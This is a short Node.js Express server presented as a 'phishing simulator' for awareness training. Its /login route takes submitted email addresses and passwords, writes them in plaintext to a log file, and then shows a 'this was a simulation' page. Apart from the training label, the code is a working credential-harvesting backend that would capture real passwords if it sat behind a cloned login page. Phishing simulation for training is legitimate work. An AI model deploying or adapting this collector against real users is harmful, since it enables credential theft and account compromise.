const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const log = `Email: ${email}, Password: ${password}\n`;
  
  // Log to file (insecure: for training use only!)
  fs.appendFileSync('log.txt', log);

  // Redirect to real site or thank-you page
  res.send('<h1>Thank you</h1><p>This was a simulation.</p>');
});

app.listen(3000, () => {
  console.log('Phishing simulator running at http://localhost:3000');
});
